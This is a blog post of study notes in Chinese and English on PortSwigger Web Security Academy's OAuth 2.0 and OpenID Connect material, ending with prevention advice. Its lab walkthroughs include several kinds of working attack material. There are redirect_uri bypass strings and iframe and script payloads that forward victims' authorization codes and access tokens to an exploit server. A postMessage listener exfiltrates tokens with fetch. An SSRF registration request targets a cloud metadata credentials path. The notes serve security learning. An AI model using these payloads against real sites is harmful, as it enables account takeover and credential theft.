---
layout: article
title: WSAcademy 21 -- OAuth
mathjax: true
key: a00032
cover: /bkgs/1.png
modify_date: 2021-10-21
show_author_profile: true
excerpt_type: html
tag: 
- WSAcademy
- OAuth
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

这篇是Web Security Academy的OAuth部分<!--more-->，系列笔记是按照路线顺序而不是时间顺序排序的，所以有些序号有些错位。

原文：[OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth)



OAuth 2.0通过定义三个不同的对象之间的一系列交互来工作，

- 客户端应用程序——**想**访问用户数据的网站或web应用程序。


- 资源所有者——客户端应用程序希望访问其数据的用户。


- OAuth服务提供商——**控制**用户数据及其访问的网站或应用程序。它们通过提供用与授权服务器和资源服务器交互的API来**支持**OAuth。

## OAuth "flows" or "grant types"：

Academy mainly focus on the "**authorization code**" and "**implicit**" grant types（most common）

Broadly speaking, both of these grant types involve the following stages:

1.客户端请求数据，指定授权类型

2.用户登录到Oauth服务并同意

3.客户端接收访问令牌

4.client用户使用令牌进行API调用以获取数据

### OAuth grant types

#### OAuth scopes

对于任何OAuth授权类型，客户机应用程序都必须**指定**要访问的数据以及要执行的操作类型。它使用它发送给OAuth服务的授权请求的**scope**参数来实现这一点。

like：

- scope=contacts
- scope=contacts.read
- scope=contact-list-r
- scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly

## Authorization code grant type

![10](/pics/WSA/10.jpg)

### 1.Authorization request

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

- **client_id**

一个必需参数，包含客户端应用程序在OAuth服务中注册时生成的客户端应用程序的唯一标识符。

- **redirect_uri**

向客户端应用程序发送授权代码时，用户浏览器应重定向到的URI。这也称为"callback URI”或“callback endpoint”。**许多OAuth攻击都是基于此参数验证中的漏洞。**

- **response_type**

确定客户端应用程序预期的**响应类型**，以及它希望启动的流。对于授权代码授权类型，值应为**code**。

- **scope**

用于指定客户端应用程序要访问的用户数据子集。

- **state**

与**csrf令牌**类似，确保对其/回调端点的请求来自发起OAuth流的同一个人

### 2. User login and consent

当**授权服务器**收到初始请求时，它会将用户重定向到登录页面，在该页面上会提示用户登录到OAuth提供程序的帐户。比如登录twitter。

只要Oauth服务中的会话仍然有效，用户就不必再次登录

### 3.Authorization code grant

```http
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

如果用户同意请求的访问，他们的浏览器将重定向到授权请求的redirect_uri参数中指定的/callback端点

它还可以发送与授权请求中的值相同的**state**参数。

### 4.Access token request

```http
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

一旦客户端应用程序收到授权码，它就需要将其交换为访问令牌

从这一点开始的所有通信都在**安全的后台通道**中进行

- client_secret

  客户端应用程序必须通过包括在向OAuth服务**注册**时分配的密钥来进行自身身份验证。 

- grant_type

  用于确保新端点知道客户端应用程序要使用的**授权类型**。在这种情况下，应将其设置为 authorization_code。

### 5.Access token grant

```
{
	"access_token": "z0y9x8w7v6u5",
	"token_type": "Bearer",
	"expires_in": 3600,
	"scope": "openid profile",
	…
}
```

OAuth服务将验证访问令牌请求并授予访问令牌

### 6.API call

```http
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

access token在Authorization:Bearer标头中提交，以证明客户端应用程序有权访问此数据。

### 7.Resource grant

```
{
	"username":"carlos",
	"email":"carlos@carlos-montoya.net",
	…
}
```

在OAuth身份验证的情况下，它通常将被用作一个**ID**来授予用户一个经过身份验证的会话

## Implicit grant type

隐式授权类型要简单得多。客户端应用程序不是首先获取授权码然后将其交换为访问令牌，而是在用户同意后立即接收访问令牌。

![11](/pics/WSA/11.jpg)

当使用隐式授权类型时，所有通信都通过浏览器重定向进行——在授权代码流中**没有安全的后台通道**

隐式授权类型更适合于单页应用程序和本机桌面应用程序，因为它们**不容易地将`client_secret`存储在后端**

### 1.Authorization request

same

The only major difference is that the `response_type` parameter must be set to `token`.

### 2.User login and consent

same user need to agree

### 3.Access token grant

this is where things start to differ

OAuth服务将用户的浏览器重定向到授权请求中指定的 `redirect_uri`

它将访问令牌和其他特定于令牌的数据作为**URL片段发送，而不是包含授权代码的查询参数**。

client will store the `token`

```http
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```

### 4.API call

与授权代码流不同，这也**通过浏览器进行**。

```http
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

### 5.Resource grant

在OAuth身份验证的情况下，它通常将被用作一个**ID**来授予用户一个经过身份验证的会话

## How do OAuth [authentication vulnerabilities](https://portswigger.net/web-security/authentication) arise?

- OAuth身份验证漏洞的出现部分是因为OAuth规范在设计上相对**模糊和灵活**

- OAuth的另一个关键问题是普遍缺乏内置的安全特性

## Identifying OAuth authentication

- 如果您看到一个使用您的帐户从其他网站登录的选项，这基本就表明正在使用OAuth


- 留意**client_id, redirect_uri, response_type**参数

## Vulnerabilities in the OAuth client application

### Improper implementation of the implicit grant type

you might be able to change the info from Oauth server after token validation

### Flawed CSRF protection

Therefore,  if you notice that the authorization request does not send a state parameter, this is extremely     interesting from an attacker's perspective

- （没有state防csrf）登陆后绑定账号，抓包并丢掉GET  /oauth-linking?code=[...] 包，复制url并发送给victim，诱使点击，即可用自己的账号绑定victim的

## Leaking authorization codes and access tokens

```html
<iframe src="https://YOUR-LAB-OAUTH-SERVER-ID.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

类似这样的东西可以诱使受害者向您发送代码或令牌，以便您可以使用它们以受害者的身份登录

更安全的授权服务器在交换代码时也**需要发送`redirect_uri`参数**

### Flawed redirect_uri validation

客户端应用程序在向OAuth服务注册时，最好提供其真实回调**URI**的**白名单**

但是，仍然有一些方法可以绕过此验证。（可能只验证部分内容，如开头等）

```
like：  https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
or https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
or localhost.evil-user.net.
```

### Stealing codes and access tokens via a proxy page

如果无法成功提交外部域作为 `redirect_uri`，则可以始终尝试指向白名单域上的任何其他页面。（或目录遍历）

like: 

[https://client-app.com/oauth/callback/../../example/path](https://client-app.com/example/path)

May be interpreted on the back-end as:

https://client-app.com/example/path

为此目的，最有用的漏洞之一是`open redirect`。您可以将其用作代理，将受害者及其代码或令牌转发到攻击者控制的域，您可以在该域中托管任何恶意脚本。

```
lab1：
		a. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in
		b. 尝试绕过redirect_uri白名单，如目录穿越
		如：https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
		c. 尝试其他页面 GET /post/next?path=/post?postId=5 可以是任意页面，包括exploit server，
		d. 找到攻击点，尝试构造payload
		https://ac0d1f431f5aeee180e301eb024700f5.web-security-academy.net/auth?client_id=j93y4jw6c8idaldj4fq0u&redirect_uri=https://acd11f4e1f1fee8a80ef015700530030.web-security-academy.net/oauth-callback/../post/next?path=https://ac801ff11fceeefe801f01b001df0038.web-security-academy.net/exploit&response_type=token&nonce=-188102786&scope=openid%20profile%20email
		redirect_uri 指向exploit server
		e. 在exploit server 构造payload 
		<script>
		  if (!document.location.hash) {
		    window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
		  } else {
		    window.location = '/?'+document.location.hash.substr(1)
		  }
		</script>
		发送给victim
		f. 重新发包 GET /me 修改token 以获得admin的apikey
		（document.location.hash   ：
hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）location.hash可以用来获取或设置页面的标签值）
```

一些很好的示例允许您提取代码或令牌并将其发送到外部域：

- 处理查询参数和URL片段的危险JavaScript

- XSS漏洞

- HTML注入漏洞：

  consider the following img element: 

  ```
  <img src="evil-user.net">
  ```

lab2：

1. test and find there is a same vulnerable uri like the previous one 
2. 审核其他页面并在Burp中找到/post/comment/comment表单页面，注意它使用postMessage（）方法将window.location.href属性发送到其父窗口。最重要的是，它允许将消息发布到任何来源（*）
3. in exploit server 

```html
<iframe src="https://YOUR-LAB-AUTH-SERVER/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
```

​	4.add like this below the payload :

```html
<script>
 window.addEventListener('message', function(e) {
  fetch("/" + encodeURIComponent(e.data.data))
 }, false)
</script>
```

​	5.GET /me as well

## Flawed scope validation

在某些情况下，由于OAuth服务的验证存在缺陷，攻击者可能会使用额外权限**“升级”访问令牌**（窃取或通过恶意客户端应用程序获得）。执行此操作的过程取决于授予类型。

### Scope upgrade: authorization code flow

例如，假设攻击者的**恶意客户端应用程序**最初使用openid电子邮件作用scope请求访问用户的电子邮件地址。用户批准此请求后，恶意客户端应用程序将收到授权代码。当攻击者控制其客户端应用程序时，他们可以将**另一个scope参数**添加到包含附加配置文件scope的代码/令牌交换请求中：

### Scope upgrade: implicit flow

访问令牌通过浏览器发送，这意味着攻击者可以窃取令牌，并向OAuth服务的/userinfo端点发送基于浏览器的普通请求，在过程中手动添加新的作用scope参数。

### Unverified user registration

客户端应用程序隐式**假设**OAuth提供程序存储的信息是**正确的**

**示例**：攻击者可以通过使用与目标用户**相同的详细信息**（如已知**电子邮件地址**（？？？））向OAuth提供程序注册帐户来利用此漏洞进行攻击

## OpenID Connect

OAuth最初的设计并没有考虑到身份验证

它旨在成为在应用程序之间为**特定资源**授权的一种手段。

不同应用间**授权**特定资源的，而OAuth本身机制并不理想，没有标准（针对身份认证）。



OpenID Connect通过添加标准化的，与身份相关的特性使通过OAuth的身份验证以更可靠和统一的方式工作，解决了很多问题（为了正确地支持OAuth，客户端应用程序必须为每个提供程序配置单独的OAuth机制，每个提供程序具有不同的端点、唯一的作用域集，等等）

### How does OpenID Connect work?

OpenID Connect slots neatly into the normal [OAuth flows](https://portswigger.net/web-security/oauth/grant-types). 

从客户机应用程序的角度来看，**关键的区别**在于，有**一组额外的、标准化的scopes**，对所有提供者来说都是相同的，还有一个**额外的响应类型：id_token。**

#### OpenID Connect roles

The roles for OpenID Connect are essentially the same as for standard OAuth

- **Relying party** - 服务请求方

The application that is requesting authentication of a user. This is synonymous with the OAuth client application.

- **End user** - 被验证用户

The user who is being authenticated. This is synonymous with the OAuth resource owner.

- **OpenID provider** -服务提供方

 An OAuth service that is configured to support OpenID Connect.

#### OpenID Connect claims and scopes

(scope请求，拿到claim键值对)

"claims" refers to the `key:value` pairs ，like：`"family_name":"Montoya"`

`Scope` comparision：

| Oauth  | unique to each provider    |
| ------ | -------------------------- |
| OpenID | an identical set of scopes |

为了使用OpenID Connect，客户端应用程序必须在授权请求中指定作用域OpenID

like:`scope=openid profile email`

#### ID token

另一个额外由OpenID提供的是`id_token` response type，This returns a JSON web token (JWT) signed with a JSON web signature (JWS)

The JWT payload contains a list of **claims** based on the scope that was initially requested. It also contains information about **how and when** the user was last authenticated by the OAuth service



 `id_token`  could provide better performance overall

不必获取访问令牌，然后单独请求用户数据，而是在用户进行身份验证后，立即将包含此数据的ID令牌发送到客户端应用程序。

 (normally exposed on `/.well-known/jwks.json`),

### Identifying OpenID Connect

最简单的识别方法是查找the mandatory `openid` scope。

或者您可以简单地尝试添加openid范围或将响应类型更改为 `id_token`，并观察这是否会导致错误。

try   `/.well-known/openid-configuration.`   to access the configuration file from the standard endpoint

### OpenID Connect vulnerabilities

In fact, you might have noticed that all of our [OAuth authentication labs](https://portswigger.net/web-security/all-labs#oauth-authentication) also use OpenID Connect.

#### Unprotected dynamic client registration

如果支持动态客户端注册，则客户端应用程序可以通过向 /registration端点发送`POST`请求来注册自身

在请求主体中，客户机应用程序以JSON格式提交关于自身的关键信息。例如，它通常需要包含一个白名单重定向URI数组

```http
POST /openid/register HTTP/1.1
Content-Type: application/json
Accept: application/json
Host: oauth-authorization-server.com
Authorization: Bearer ab12cd34ef56gh89

{
	"application_type": "web",
	"redirect_uris": [
	"https://client-app.com/callback",
	"https://client-app.com/callback2"
	],
	"client_name": "My Application",
	"logo_uri": "https://client-app.com/logo.png",
	"token_endpoint_auth_method": "client_secret_basic",
	"jwks_uri": "https://client-app.com/my_public_keys.jwks",
	"userinfo_encrypted_response_alg": "RSA1_5",
	"userinfo_encrypted_response_enc": "A128CBC-HS256",
	…
}
```

OpenID提供程序应该要求客户端应用程序进行自身身份验证

但是，某些提供程序将允许动态客户端注册而**不进行任何身份验证**，这使攻击者能够注册自己的恶意客户端应用程序

例如，您可能已经注意到其中一些属性可以作为URI提供。如果OpenID提供程序访问其中任何一个，这可能会导致 second-order SSRF漏洞，除非有其他安全措施。

```
	lab：(文档找end-point ，尝试修改动态内容为目标url，然后ssrf)
		○ find the configuration file https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/.well-known/openid-configuration
		○ try to register 
		
		POST /reg HTTP/1.1
		Host: YOUR-LAB-OAUTH-SERVER.web-security-academy.net
		Content-Type: application/json
		
		{
		  "redirect_uris" : [
		    "https://example.com"
		  ],
		  "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/""
		}
		○ Go back to the GET /client/CLIENT-ID/logo request and replace the client_id with the new one you just copied

```

#### Allowing authorization requests by reference

- 一些OpenID提供程序提供了将所需参数作为**JSON web令牌（JWT）**传入的选项。

  如果支持此功能，则可以发送**单个`request_uri`**参数，该参数指向包含其余OAuth参数及其值的JSON web令牌。

  此**request_uri**参数可能是**SSRF的另一个潜在vector**。

- 也可以使用此功能绕过这些参数值（如**redirect_uri**）的验证。


- 查找`request_uri_parameter_supported`选项以检查这些参数是否可用

## How to prevent OAuth authentication vulnerabilities

OAuth提供程序和客户端应用程序都必须实现对关键输入的健壮验证，尤其是`redirect_uri`参数

### For OAuth service providers

- 要求客户端应用程序注册有效重定向URI的**白名单**

  - 使用严格的**逐字节**比较来验证任何传入请求中的URI

  - 只允许**完全和精确的匹配**，而不允许使用正则匹配

- 强制使用`state`参数

  - 它的值还应该通过包含一些不可用的、特定于会话的数据（例如包含会话cookie的哈希）绑定到用户的会话

  - 这可以保护用户免受类似CSRF的攻击和密码被盗

- 在资源服务器上，确保验证访问令牌是否已颁发给发出请求的同一`client_id`


- 还应该检查**scope**

### For OAuth client applications

- 在实现OAuth之前，请确保您完全了解OAuth的工作原理


- 使用`state`参数，即使它不是强制性的。


- Send a **redirect_uri** parameter not only to the /authorization endpoint, but also to the /token endpoint


- 在开发移动或本机桌面OAuth客户端应用程序时，通常不可能将`client_secret`保密。在这些情况下，**PKCE**（RFC7638）机制可用于提供额外的保护，防止访问代码被截获或泄漏。


- 如果您使用OpenID Connect `id_token`，请确保根据JSON Web签名、JSON Web加密和OpenID规范对其进行了正确验证。


- 小心使用`authorization codes`——当加载外部图像、脚本或CSS内容时，它们可能会通过`Referer`头泄漏。同样重要的是，**不要将它们包含在动态生成的JavaScript文件中**，因为它们可以通过`<script>`标记从外部域执行

